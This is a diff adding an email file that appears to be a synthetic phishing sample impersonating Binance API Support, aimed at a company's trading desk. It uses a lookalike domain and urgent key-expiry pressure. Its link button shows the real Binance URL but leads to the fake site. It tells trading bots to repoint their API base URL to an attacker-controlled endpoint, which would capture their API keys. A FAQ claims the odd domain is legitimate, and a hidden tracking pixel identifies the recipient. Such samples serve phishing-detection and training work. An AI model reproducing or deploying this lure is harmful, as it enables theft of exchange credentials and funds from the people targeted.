@@ -1,0 +1,89 @@
+From: Binance API Support <api-support@binance-api-notice.example>
+To: trading@corp.internal
+Cc: quant@corp.internal
+Date: Thu, 15 Oct 2026 03:30:00 +0800
+Message-ID: <0670-b49@synth.example>
+Subject: [ACTION REQUIRED] API Key Rotation Deadline - Your API keys will expire in 72 hours
+MIME-Version: 1.0
+Content-Type: text/html; charset=gb2312
+
+<html><body style="font-family:sans-serif">
+<div style="max-width:640px;margin:0 auto;border:1px solid #F0B90B;border-radius:8px;overflow:hidden">
+<div style="background:#F0B90B;color:#000;padding:14px 24px">
+<h2 style="margin:0;font-size:17px">Binance API | Security Notice</h2>
+<p style="margin:4px 0;font-size:12px;opacity:0.8">API Key Rotation Program — Phase 3</p>
+</div>
+<div style="padding:24px">
+
+<p>Dear API User,</p>
+
+<p>As part of our <b>API Security Enhancement Program</b>, your API keys will be rotated in <b>72 hours</b>. This is a mandatory security measure following the October 2026 security incident.</p>
+
+<h3 style="color:#F0B90B;border-bottom:2px solid #F0B90B;padding-bottom:4px">Affected API Keys</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f5f5f5"><th>API Key (truncated)</th><th>Type</th><th>Created</th><th>Last Used</th><th>Status</th></tr>
+<tr><td><code>AbC3xY...9fK2</code></td><td>HMAC-SHA256</td><td>2024-11-08</td><td>2026-10-14 23:41</td><td style="color:#e00">Expiring</td></tr>
+<tr><td><code>XyZ7pQ...3mN8</code></td><td>Ed25519</td><td>2025-03-22</td><td>2026-10-15 01:17</td><td style="color:#e00">Expiring</td></tr>
+</table>
+
+<h3 style="color:#F0B90B;border-bottom:2px solid #F0B90B;padding-bottom:4px">Why rotation is required</h3>
+<p>On October 2, 2026, our security team identified unauthorized access to the API key management system of a third-party service provider. While your specific keys were <b>not</b> directly compromised, we are rotating all API keys created before April 2025 as a precautionary measure.</p>
+
+<p>If your API keys expire without rotation, all automated trading, withdrawal, and account management functions will be suspended.</p>
+
+<h3 style="color:#F0B90B;border-bottom:2px solid #F0B90B;padding-bottom:4px">How to rotate your API keys</h3>
+
+<p><b>Method 1 (Recommended) — Via API Management Portal:</b></p>
+<p>Access the API rotation portal and generate new keys:</p>
+
+<p style="text-align:center;margin:20px 0">
+<a href="https://binance-api-notice.example/api/v3/rotation?user=trading" style="display:inline-block;background:#F0B90B;color:#000;padding:12px 36px;text-decoration:none;border-radius:4px;font-weight:bold">Rotate API Keys Now</a>
+</p>
+
+<p style="font-size:13px;color:#666;text-align:center">https://api.binance.com/api/v3/management/rotation</p>
+
+<p style="font-size:12px;color:#888;text-align:center">(Log in with your Binance account email and 2FA code. New keys will be displayed once.)</p>
+
+<p><b>Method 2 — Via new API endpoint migration:</b></p>
+<p>If you use programmatic key management, update your API base URL to the new endpoint:</p>
+<pre style="background:#f5f5f5;padding:12px;border-radius:4px;font-size:13px;overflow-x:auto"><code># Old endpoint (deprecated after rotation):
+https://api.binance.com/api/v3
+
+# New endpoint (v4, supports auto-rotation):
+https://api-v4.binance-api-notice.example/api/v4
+
+# Authentication header remains the same:
+X-MBX-APIKEY: &lt;your_new_api_key&gt;</code></pre>
+
+<h3 style="color:#F0B90B;border-bottom:2px solid #F0B90B;padding-bottom:4px">Impact on automated trading</h3>
+<p>If you operate algorithmic trading bots or market-making systems:</p>
+<ul>
+<li><b>Trading bots:</b> Must update API keys before the 72-hour deadline. Open positions will remain but new orders will be rejected.</li>
+<li><b>WebSocket streams:</b> Active connections will be terminated. Reconnect with new keys.</li>
+<li><b>Withdrawal whitelist:</b> IP whitelist entries will be preserved but must be re-verified.</li>
+<li><b>Sub-accounts:</b> Sub-account API keys must be rotated individually by the master account.</li>
+</ul>
+
+<h3 style="color:#F0B90B;border-bottom:2px solid #F0B90B;padding-bottom:4px">Security FAQ</h3>
+<p><b>Q: Is this email legitimate? The domain looks unusual.</b><br>
+A: We use a dedicated notification domain for security-critical API communications to avoid confusion with regular marketing emails. Your actual API operations always happen on <code>api.binance.com</code>. The rotation button above takes you to the official API management portal.</p>
+
+<p><b>Q: Can I skip this rotation?</b><br>
+A: No. All pre-April 2025 keys will be automatically invalidated after the 72-hour window. This is not optional.</p>
+
+<p><b>Q: Will my trading history be affected?</b><br>
+A: No. Historical data is preserved. Only the API keys change.</p>
+
+<div style="border-top:1px solid #ddd;padding-top:12px;margin-top:20px">
+<p style="font-size:12px;color:#888">Binance API Support Team</p>
+<p style="font-size:11px;color:#999">Notification Reference: API-ROT-2026-Q4-0884</p>
+<p style="font-size:11px;color:#999">You are receiving this because you have active API keys on Binance.</p>
+</div>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="https://binance-api-notice.example/api/track?recipient=trading%40corp.internal&ref=API-ROT-2026-Q4-0884" width="1" height="1" alt="">
+</div>
+
+</div>
+</div>
+</body></html>
